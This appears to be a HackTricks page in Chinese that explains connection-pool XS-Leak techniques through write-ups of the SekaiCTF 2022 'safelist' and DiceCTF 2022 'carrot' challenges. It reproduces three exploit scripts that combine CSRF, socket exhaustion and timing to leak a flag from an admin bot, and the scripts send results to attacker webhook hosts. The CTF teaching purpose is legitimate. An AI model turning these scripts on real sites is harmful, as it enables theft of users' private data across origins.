<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Connection Pool Examples</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="连接池示例"><a class="header" href="#连接池示例">连接池示例</a></h1>
<p>{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<h2 id="sekaictf2022---白名单"><a class="header" href="#sekaictf2022---白名单">Sekaictf2022 - 白名单</a></h2>
<p>在 <a href="https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/safelist/solution"><strong>Sekaictf2022 - 白名单</strong></a> 挑战中， <a href="https://twitter.com/Strellic_"><strong>@Strellic_</strong></a> 给出了如何使用 <strong>连接池</strong> 技术的 <strong>变体</strong> 来执行 <strong>XS-Leak</strong> 的示例。</p>
<p>在这个挑战中，目标是提取一个将在机器人的网络会话中出现在帖子中的标志。这是攻击者拥有的资产：</p>
<ul>
<li><strong>机器人</strong>将<strong>访问</strong>攻击者给定的<strong>URL</strong></li>
<li>攻击者可以在页面中<strong>注入 HTML</strong>（但不允许 JS，使用了 dompurify）利用 <strong>CSRF</strong> 使 <strong>机器人创建一个帖子</strong>，其中包含该 HTML。</li>
<li>攻击者可以利用 CSRF 使 <strong>机器人</strong> <strong>删除</strong>网站中的<strong>第一个</strong> <strong>帖子</strong>。</li>
<li>由于 <strong>帖子</strong> 是按 <strong>字母顺序</strong> 排序的，当 <strong>第一个帖子被删除</strong> 时，如果攻击者的 <strong>HTML</strong> 内容被 <strong>加载</strong>，则意味着它在 <strong>标志之前的字母顺序</strong>。</li>
</ul>
<p>因此，为了窃取标志，@Strellyc_ 提出的解决方案是，对于 <strong>每个字符进行测试</strong>，使机器人：</p>
<ul>
<li>创建一个 <strong>新帖子</strong>，该帖子以已知的 <strong>标志</strong> 部分开头，并加载多个 <strong>img</strong>。</li>
<li><strong>删除</strong>位置为 <strong>0</strong> 的 <strong>帖子</strong>。</li>
<li>阻塞 255 个套接字。</li>
<li>加载包含帖子页面。</li>
<li>对一个网站（在此案例中为 example.com）执行 5 次随机请求，并测量所需时间。</li>
</ul>
<p>{% hint style="warning" %}
如果 <strong>删除</strong> 的帖子是 <strong>标志</strong>，这意味着所有在 HTML 中 <strong>注入</strong> 的 <strong>图像</strong> 将与 <strong>5 次随机请求</strong> 为该 <strong>未阻塞</strong> 的套接字 <strong>竞争</strong>。这意味着测量的时间将比其他情况更长。</p>
<p>如果 <strong>删除</strong> 的帖子是 <strong>HTML</strong>，则 <strong>5 次随机请求</strong> 将会更 <strong>快</strong>，因为它们不需要与注入的 HTML 争夺该套接字。
{% endhint %}</p>
<h3 id="利用-1"><a class="header" href="#利用-1">利用 1</a></h3>
<p>这是利用代码，取自 <a href="https://github.com/project-sekai-ctf/sekaictf-2022/blob/main/web/safelist/solution/solve.html">https://github.com/project-sekai-ctf/sekaictf-2022/blob/main/web/safelist/solution/solve.html</a>:</p>
<pre><code class="language-html">&lt;!-- Form to inject HTML code in the bots page --&gt;
&lt;form method="POST" action="https://safelist.ctf.sekai.team/create" id="create" target="_blank"&gt;
&lt;input type="text" name="text" /&gt;
&lt;input type="submit" /&gt;
&lt;/form&gt;

&lt;!-- Form to delete the first entry --&gt;
&lt;form method="POST" action="https://safelist.ctf.sekai.team/remove" id="remove" target="_blank"&gt;
&lt;input type="text" name="index" value="0" /&gt;
&lt;input type="submit" /&gt;
&lt;/form&gt;

&lt;script&gt;
// Attacker listening
const WEBHOOK = "https://WEBHOOK.com/";
// Send data to attacker
const log = (id, data) =&gt; {
let payload = JSON.stringify({ known, alphabet, data });
console.log(id, payload);
navigator.sendBeacon(WEBHOOK + "?" + id, payload);
}

// Similar to JQuery
const $ = document.querySelector.bind(document);

// Known part of the flag
const known = "SEKAI{";
let alphabet = "_abcdefghijklmnopqrstuvwxyz}";

// Reduce the alphabet using a hash (#) in the URL
if (location.hash) {
alphabet = alphabet.slice(alphabet.indexOf(location.hash.slice(1)));
}

// Funtion to leak chars
const leak = async (c) =&gt; {
// Prepare post with known flag and the new char
let payload = `${known + c}`;
// Inject as many &lt;img as possible
// you need to respect the CSP and create URLs that are different
for(let i = 0; payload.length &lt; 2048; i++) {
payload += `&lt;img src=js/purify.js?${i.toString(36)}&gt;`;
}

// Inject HTML
$("#create input[type=text]").value = payload;
$("#create").submit();
await new Promise(r =&gt; setTimeout(r, 1000));

// Remove post with index 0
$("#remove").submit();
await new Promise(r =&gt; setTimeout(r, 500));

let deltas = [];

// Try each char 3 times
for (let i = 0; i &lt; 3; i++) {
const SOCKET_LIMIT = 255;
// you will need a custom server that works like num.sleepserver.com/sleep/delay
// needed to freeze the blocked sockets, and they have to all be on different origins
// Check https://www.npmjs.com/package/sleep-server using subdomains DNS wildcard
const SLEEP_SERVER = i =&gt; `http://${i}.sleepserver.com/sleep/60`;

const block = async (i, controller) =&gt; {
try {
return fetch(SLEEP_SERVER(i), { mode: "no-cors", signal: controller.signal });
}
catch(err) {}
};

// block SOCKET_LIMIT sockets
const controller = new AbortController();
for (let i = 0; i &lt; SOCKET_LIMIT; i++) {
block(i, controller);
}

// Make the bot access the page with the posts
window.open("https://safelist.ctf.sekai.team/?" + Math.random().toString(36).slice(2), "pwn");
await new Promise(r =&gt; setTimeout(r, 500));

// start meassuring time to perform 5 requests
let start = performance.now();
await Promise.all([
fetch("https://example.com", { mode: "no-cors" }),
fetch("https://example.com", { mode: "no-cors" }),
fetch("https://example.com", { mode: "no-cors" }),
fetch("https://example.com", { mode: "no-cors" }),
fetch("https://example.com", { mode: "no-cors" })
]);
let delta = performance.now() - start;
document.title = delta;
controller.abort();

log("test_" + c + "_" + i, delta);

// Save time needed
deltas.push(delta);
}
return deltas;
};

// Check each char
const pwn = async () =&gt; {
// Try to leak each character
for(let i = 0; i &lt; alphabet.length; i++) {
//Check the indicated char
let deltas = await leak(alphabet[i]);

// Calculate mean time from requests to example.com
let avg = deltas.reduce((a,v) =&gt; a+v, 0) / deltas.length;

// If greater than 250, the HTML code was injected (flag in index 0)
if (avg &gt; 250) {
log("tests_pos_" + alphabet[i], deltas)
}
// Flag in the page
else {
log("tests_neg_" + alphabet[i], deltas)
}
}
};

window.onload = async () =&gt; {
pwn();
};
&lt;/script&gt;
</code></pre>
<h3 id="exploit-2"><a class="header" href="#exploit-2">Exploit 2</a></h3>
<p>相同的策略，但代码不同，来自 <a href="https://blog.huli.tw/2022/10/05/en/sekaictf2022-safelist-xsleak/">https://blog.huli.tw/2022/10/05/en/sekaictf2022-safelist-xsleak/</a></p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;!--
The basic idea is to create a post with a lot of images which send request to "/" to block server-side nodejs main thread.
If images are loading, the request to "/" is slower, otherwise faster.
By using a well-crafted height, we can let note with "A" load image but note with "Z" not load.
We can use fetch to measure the request time.
--&gt;
&lt;body&gt;
&lt;button onclick="run()"&gt;start&lt;/button&gt;
&lt;form id=f action="http://localhost:1234/create" method="POST" target="_blank"&gt;
&lt;input id=inp name="text" value=""&gt;
&lt;/form&gt;

&lt;form id=f2 action="http://localhost:1234/remove" method="POST" target="_blank"&gt;
&lt;input id=inp2 name="index" value=""&gt;
&lt;/form&gt;
&lt;script&gt;
let flag = 'SEKAI{'
const TARGET = 'https://safelist.ctf.sekai.team'
f.action = TARGET + '/create'
f2.action = TARGET + '/remove'

const sleep = ms =&gt; new Promise(r =&gt; setTimeout(r, ms))
const send = data =&gt; fetch('http://server.ngrok.io?d='+data)
const charset = 'abcdefghijklmnopqrstuvwxyz'.split('')

// start exploit
let count = 0
setTimeout(async () =&gt; {
let L = 0
let R = charset.length - 1
while( (R-L)&gt;3 ) {
let M = Math.floor((L + R) / 2)
let c = charset[M]
send('try_' + flag + c)
const found = await testChar(flag + c)
if (found) {
L = M
} else {
R = M - 1
}
}

// fallback to linear since I am not familiar with binary search lol
for(let i=R; i&gt;=L; i--) {
let c = charset[i]
send('try_' + flag + c)
const found = await testChar(flag + c)
if (found) {
send('found: '+ flag+c)
flag += c
break
}
}

}, 0)

async function testChar(str) {
return new Promise(resolve =&gt; {
/*
For 3350, you need to test it on your local to get this number.
The basic idea is, if your post starts with "Z", the image should not be loaded because it's under lazy loading threshold
If starts with "A", the image should be loaded because it's in the threshold.
*/
inp.value = str + '&lt;br&gt;&lt;canvas height="3350px"&gt;&lt;/canvas&gt;&lt;br&gt;'+Array.from({length:20}).map((_,i)=&gt;`&lt;img loading=lazy src=/?${i}&gt;`).join('')
f.submit()

setTimeout(() =&gt; {
run(str, resolve)
}, 500)
})
}

async function run(str, resolve) {
// if the request is not enough, we can send more by opening more window
for(let i=1; i&lt;=5;i++) {
window.open(TARGET)
}

let t = 0
const round = 30
setTimeout(async () =&gt; {
for(let i=0; i&lt;round; i++) {
let s = performance.now()
await fetch(TARGET + '/?test', {
mode: 'no-cors'
}).catch(err=&gt;1)
let end = performance.now()
t += end - s
console.log(end - s)
}
const avg = t/round
send(str + "," + t + "," + "avg:" + avg)

/*
I get this threshold(1000ms) by trying multiple times on remote admin bot
for example, A takes 1500ms, Z takes 700ms, so I choose 1000 ms as a threshold
*/
const isFound = (t &gt;= 1000)
if (isFound) {
inp2.value = "0"
} else {
inp2.value = "1"
}

// remember to delete the post to not break our leak oracle
f2.submit()
setTimeout(() =&gt; {
resolve(isFound)
}, 200)
}, 200)
}

&lt;/script&gt;

&lt;/body&gt;

&lt;/html&gt;
</code></pre>
<h2 id="dicectf-2022---carrot"><a class="header" href="#dicectf-2022---carrot">DiceCTF 2022 - carrot</a></h2>
<p>在这个案例中，利用的第一步是滥用 CSRF 来修改包含标志的页面，使其具有 <strong>更多内容</strong>（因此加载时间更长），然后 <strong>滥用连接池来测量访问可能包含标志的页面所需的时间</strong>。</p>
<p>在这个利用中你可以看到：</p>
<ul>
<li>滥用 CSRF</li>
<li>占用所有套接字但保留 1 个</li>
<li>校准响应</li>
<li>通过访问可能包含标志的页面开始暴力破解</li>
<li>将访问潜在页面，并立即访问攻击者控制的 URL，以检查两个请求所需的时间。</li>
</ul>
<pre><code class="language-html">&lt;h1&gt;DiceCTF 2022 web/carrot&lt;/h1&gt;

&lt;p&gt;Step 1: CSRF the admin user, to set a super long title for the flag note (LAX + POST form only possible for 2 minutes after cookies is created)&lt;/p&gt;
&lt;button onclick="csrf()"&gt;do csrf&lt;/button&gt;
&lt;p&gt;Step 2: XS-Search with &lt;a href="https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/"&gt;connection-pool timing leak&lt;/a&gt;, we have to use window.open (LAX cookie)&lt;/p&gt;

&lt;button onclick="popunder()"&gt;open popup&lt;/button&gt;
&lt;button onclick="exhaust_sockets()"&gt;open 255 connections&lt;/button&gt;
&lt;button onclick="oracle('dice{abc')"&gt;test search "abc" (slow)&lt;/button&gt;
&lt;button onclick="oracle('dice{xxx')"&gt;test search "xxx" (fast)&lt;/button&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h2 id=output&gt;&lt;/h2&gt;
&lt;br&gt;
&lt;form id=x action="" method="POST" style="display:none;"&gt;
&lt;input type="text" name="title" placeholder="title"&gt;
&lt;br&gt;&lt;br&gt;
&lt;input type="number" name="priority" placeholder="priority" value=9999&gt;
&lt;br&gt;&lt;br&gt;
&lt;textarea name="content" placeholder="content" rows="5" cols="20"&gt;&lt;/textarea&gt;
&lt;br&gt;&lt;br&gt;
&lt;input type="submit" value="submit"&gt;
&lt;/form&gt;

&lt;script&gt;

// this is send is used as logging
LOG = 'Starting'
// 255 in normal chrome, 99 in headless
SOCKETLIMIT = 255;
// default
TIMELIMIT = 800;
INSTANCE = ''
MYSERVER = `example.com`

const sleep = (ms) =&gt; {
return new Promise(resolve =&gt; {
setTimeout(resolve, ms);
});
}

const time_fetch = async() =&gt; {
let test_server_url = `https://${MYSERVER}/?${LOG}`;
let start = window.performance.now();
try {
await fetch(test_server_url, {
mode: 'no-cors'
});
} catch (e) {
console.log(e);
}
let end = window.performance.now();
return end - start;
}

const fetch_sleep_long = (i) =&gt; {
// 40s sleep
return fetch(`https://${i}.${MYSERVER}/40sleep`, {
mode: 'no-cors'
});
}

const fetch_sleep_short = (i) =&gt; {
// 0.25s sleep
return fetch(`https://${i}.${MYSERVER}/ssleep`, {
mode: 'no-cors'
});
}

const block_socket = async (i) =&gt; {
fetch_sleep_long(i);
// needed?
await sleep(0);
}

const exhaust_sockets = async() =&gt; {
let i = 0
for (; i &lt; SOCKETLIMIT; i++) {
block_socket(i);
}
console.log(`Used ${i} connections`);
}

const timeit = async (url, popup) =&gt; {
return new Promise(async (r) =&gt; {

popup.location = url;
// needed?
await sleep(50)

let val = await time_fetch()
r(val)
});
}

// const alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-}!"#$%&amp;\'()*+,-./:;&lt;=&gt;?@[\\]^`|~{'.split('');
const alphabet = 'abcdefghijklmnopqrstuvwxyz}_'.split('');
// const alphabet = 'abcdef}'.split('');

const oracle = async (search) =&gt; {
let url = `https://carrot-${INSTANCE}.mc.ax/tasks?search=${search}`
let t = await timeit(url, WINBG)

LOG = `${search}:${t}`
console.log(`${search}:${t}`)

return t &gt; TIMELIMIT
}

const brute = async (flag) =&gt; {
for (const char of alphabet) {
if (await oracle(flag + char)) {
return char;
}
}
return false;
}

const calibrate = async () =&gt; {
return new Promise(async (r) =&gt; {
// slow
let url1 = `https://carrot-${INSTANCE}.mc.ax/tasks?search=dice{`
let t1 = await timeit(url1, WINBG)
console.log(`slow:${t1}`)
// fast
let url2 = `https://carrot-${INSTANCE}.mc.ax/tasks?search=XXXXXXXXXX`
let t2 = await timeit(url2, WINBG)
console.log(`fast:${t2}`)
return r((t1 + t2) / 2)
});

}

const exploit = async(flag = '') =&gt; {
console.log('Starting')
// dont go to fast plz :)
console.log(`waiting 3s`)
await sleep(3000)
// exaust sockets
await exhaust_sockets()
await sleep(2000)
LOG = `Calibrating`
TIMELIMIT = await calibrate()
LOG = `TIMELIMIT:${TIMELIMIT}`
console.log(`timelimit:${TIMELIMIT}`)
await sleep(2000)
let last;
while (true) {
last = await brute(flag);
if (last === false) {
return flag;
}
else {
flag += last;
output.innerText = flag;
if(last === '}'){
return flag
}
}
}
}

const popunder = () =&gt; {
if (window.opener) {
WINBG = window.opener
}
else {
WINBG = window.open(location.href, target="_blank")
location = `about:blank`
}
}

const csrf = async () =&gt; {
x.action = `https://carrot-${INSTANCE}.mc.ax/edit/0`
x.title.value = "A".repeat(1000000)
x.submit()
}

window.onload = () =&gt; {
let p = new URL(location).searchParams;
if(!p.has('i')){
console.log(`no INSTANCE`)
return
}
INSTANCE = p.get('i')
// step 1
if(p.has('csrf')){
csrf()
return
}
// step 2
if (p.has('exploit')) {
// window open is ok in headless :)
popunder()

exploit('dice{')
}
}
&lt;/script&gt;
</code></pre>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../pentesting-web/xs-search/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../pentesting-web/xs-search/connection-pool-by-destination-example.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../pentesting-web/xs-search/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../pentesting-web/xs-search/connection-pool-by-destination-example.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
